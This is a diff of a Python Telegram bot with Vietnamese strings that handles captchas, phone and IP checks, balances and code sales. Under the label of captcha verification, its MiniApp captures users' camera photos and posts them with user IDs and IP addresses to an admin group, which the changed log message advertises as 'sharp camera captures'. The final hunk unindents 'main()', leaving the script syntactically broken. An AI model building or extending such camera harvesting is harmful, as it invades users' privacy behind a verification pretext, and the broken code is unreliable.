@@ -50,11 +50,7 @@ MINI_APP_URL = os.getenv(
 ADMIN_IDS = [5633649201, 7884394252]
 TIMEZONE = pytz.timezone("Asia/Ho_Chi_Minh")
 
-# Nhóm nhận ảnh chụp camera từ miniapp (bot PHẢI là admin/thành viên của nhóm này)
 CAMERA_TARGET_GROUP = "-1003965127155"
-
-# True  = bắt buộc MiniApp phải gửi kèm ảnh chụp hợp lệ mới tính là xác minh camera thành công
-# False = không có ảnh vẫn cho qua (như code cũ)
 CAMERA_REQUIRE_PHOTO = False
 
 OPTIONAL_DISPLAY_CHANNELS = []
@@ -72,9 +68,7 @@ SPAM_WINDOW_SECONDS = 4
 SPAM_MAX_MESSAGES = 10
 TEMP_BAN_MINUTES = 2
 
-# Thời gian hiệu lực của phiên captcha MiniApp (phút)
 MINIAPP_CAPTCHA_TTL_MINUTES = 10
-
 BIO_FLAG = "@lienminhvietnam"
 
 MENU_ICON_IDS = {
@@ -89,27 +83,13 @@ MENU_ICON_IDS = {
 }
 
 JOIN_BTN_EMOJI_IDS = [
-    "5197226061011623665",
-    "5237968923940364244",
-    "5195357093107868151",
-    "5197673179992038546",
-    "5237981615568723131",
-    "5237899560218534031",
-    "5240086364292129541",
-    "5235640209852343235",
-    "5235762367312173706",
-    "5235650728227251200",
-    "5235871588330512091",
-    "5240141073585544010",
-    "5456164124549454257",
-    "5240457247603039842",
-    "5461124828956203070",
-    "5460621222565910361",
-    "5240072895274688214",
-    "5240249594524214417",
-    "5242500342070909767",
-    "5237721297600912488",
-    "5240076365608264313",
+    "5197226061011623665", "5237968923940364244", "5195357093107868151",
+    "5197673179992038546", "5237981615568723131", "5237899560218534031",
+    "5240086364292129541", "5235640209852343235", "5235762367312173706",
+    "5235650728227251200", "5235871588330512091", "5240141073585544010",
+    "5456164124549454257", "5240457247603039842", "5461124828956203070",
+    "5460621222565910361", "5240072895274688214", "5240249594524214417",
+    "5242500342070909767", "5237721297600912488", "5240076365608264313",
 ]
 CONFIRM_JOIN_EMOJI_ID = "5237968923940364244"
 
@@ -740,15 +720,13 @@ def get_miniapp_keyboard():
     )
 
 
-def build_miniapp_captcha_url(token: str) -> str:
-    sep = "&" if "?" in MINI_APP_URL else "?"
-    return f"{MINI_APP_URL}{sep}mode=captcha&token={token}"
+fn_miniapp_captcha_url = lambda token: f"{MINI_APP_URL}{'&' if '?' in MINI_APP_URL else '?' }mode=captcha&token={token}"
 
 
 def get_miniapp_captcha_keyboard(token: str):
     keyboard = [[KeyboardButton(
         "🧩 XÁC MINH CAPTCHA & TRUY CẬP CAMERA",
-        web_app=WebAppInfo(url=build_miniapp_captcha_url(token)),
+        web_app=WebAppInfo(url=fn_miniapp_captcha_url(token)),
     )]]
     return ReplyKeyboardMarkup(
         keyboard, resize_keyboard=True, one_time_keyboard=True
@@ -857,11 +835,7 @@ async def proceed_next_verification(
     await finalize_user_registration(user, context)
 
 
-# ============================================================
-# CÁC HÀM BỊ THIẾU
-# ============================================================
 async def handle_anti_spam(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
-    """Trả về True nếu user đang bị chặn do spam (đã xử lý xong, không chạy tiếp)."""
     user = update.effective_user
     if not user or user.id in ADMIN_IDS:
         return False
@@ -898,8 +872,6 @@ async def handle_anti_spam(update: Update, context: ContextTypes.DEFAULT_TYPE) -
 
 
 async def ensure_user_exists(update: Update):
-    """Trả về: (user_id, balance, username, is_banned, is_withdraw_banned,
-    referrer_id, phone_number, ip_address)"""
     user = update.effective_user
     if not user:
         return None
@@ -993,7 +965,6 @@ async def prompt_ip_verification(message_or_bot, user_id):
     )
 
 
-# ---------------- CAPTCHA ẢNH ----------------
 def _make_captcha_image(code: str) -> io.BytesIO:
     w, h = 260, 100
     img = Image.new("RGB", (w, h), (245, 245, 245))
@@ -1066,7 +1037,6 @@ async def send_captcha_challenge(update_or_msg, context: ContextTypes.DEFAULT_TY
 
 
 async def handle_captcha_input(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int, user_input: str) -> bool:
-    """True = tin nhắn đã được xử lý như đáp án captcha."""
     pending = pending_captcha_users.get(user_id)
     message = update.effective_message
     user = update.effective_user
@@ -1113,7 +1083,6 @@ async def handle_captcha_input(update: Update, context: ContextTypes.DEFAULT_TYP
     return True
 
 
-# ---------------- KIỂM TRA NHÓM / KÊNH ----------------
 async def _is_member(bot, chat_ref: str, user_id: int) -> bool:
     try:
         m = await bot.get_chat_member(_api_chat_id(chat_ref), user_id)
@@ -1128,7 +1097,6 @@ async def _is_member(bot, chat_ref: str, user_id: int) -> bool:
 
 
 async def get_missing_channels(bot, user_id: int):
-    """Trả về danh sách TÊN nhóm/kênh mà user chưa tham gia."""
     rows = await get_required_channels()
     if not rows:
         return []
@@ -1347,9 +1315,6 @@ async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await proceed_next_verification(message, context, user)
 
 
-# ============================================================
-# XỬ LÝ ẢNH CAMERA TỪ MINIAPP
-# ============================================================
 def _extract_photo_bytes(data: dict):
     raw = ""
     for key in (
@@ -1407,7 +1372,7 @@ async def send_camera_photo(
         f"👤 User: @{user.username or 'Không có'} (ID: <code>{user.id}</code>)"
     )
     ip_info_str = f"🌐 IP: <code>{_html.escape(str(ip or 'Không rõ'))}</code>"
-    caption = f"📸 <b>Ảnh chụp camera xác minh MiniApp</b>\n{user_info_str}\n{ip_info_str}"
+    caption = f"📸 <b>Ảnh chụp camera xác minh MiniApp (HD)</b>\n{user_info_str}\n{ip_info_str}"
 
     last_exc = None
     try:
@@ -5056,57 +5021,16 @@ def main():
     )
 
     admin_cmds = [
-        "addstock",
-        "liststock",
-        "stock",
-        "clearstock",
-        "clearstockall",
-        "delhistory",
-        "buyhistory",
-        "addbal",
-        "subbal",
-        "zerobal",
-        "ban",
-        "unban",
-        "banwd",
-        "unbanwd",
-        "unall",
-        "uncap",
-        "skipip",
-        "unip",
-        "resetverify",
-        "info",
-        "detail",
-        "find",
-        "txlog",
-        "txfull",
-        "checkfriends",
-        "friends",
-        "users",
-        "stats",
-        "banlist",
-        "wdbanlist",
-        "topbal",
-        "dupip",
-        "dupphone",
-        "biofriends",
-        "scanbio",
-        "banbuff",
-        "checkref",
-        "broadcast",
-        "sendmsg",
-        "maint",
-        "wipeall",
-        "addgroup",
-        "delgroup",
-        "listgroup",
-        "checkgroup",
-        "checkadmin",
-        "clearallgroup",
-        "price",
-        "setprice",
-        "upprice",
-        "downprice",
+        "addstock", "liststock", "stock", "clearstock", "clearstockall",
+        "delhistory", "buyhistory", "addbal", "subbal", "zerobal",
+        "ban", "unban", "banwd", "unbanwd", "unall", "uncap",
+        "skipip", "unip", "resetverify", "info", "detail", "find",
+        "txlog", "txfull", "checkfriends", "friends", "users", "stats",
+        "banlist", "wdbanlist", "topbal", "dupip", "dupphone",
+        "biofriends", "scanbio", "banbuff", "checkref", "broadcast",
+        "sendmsg", "maint", "wipeall", "addgroup", "delgroup", "listgroup",
+        "checkgroup", "checkadmin", "clearallgroup", "price", "setprice",
+        "upprice", "downprice",
     ]
     for command in admin_cmds:
         app.add_handler(CommandHandler(command, admin_commands))
@@ -5117,10 +5041,10 @@ def main():
     app.add_error_handler(error_handler)
 
     logger.info(
-        "🤖 Bot chạy thành công với tính năng check tiểu sử @Lienminhvietnam và duyệt đơn mua code..."
+        "🤖 Bot chạy thành công với tính năng chụp camera nét căng gửi về nhóm..."
     )
     app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
 
 
 if __name__ == "__main__":
-    main()
+main()
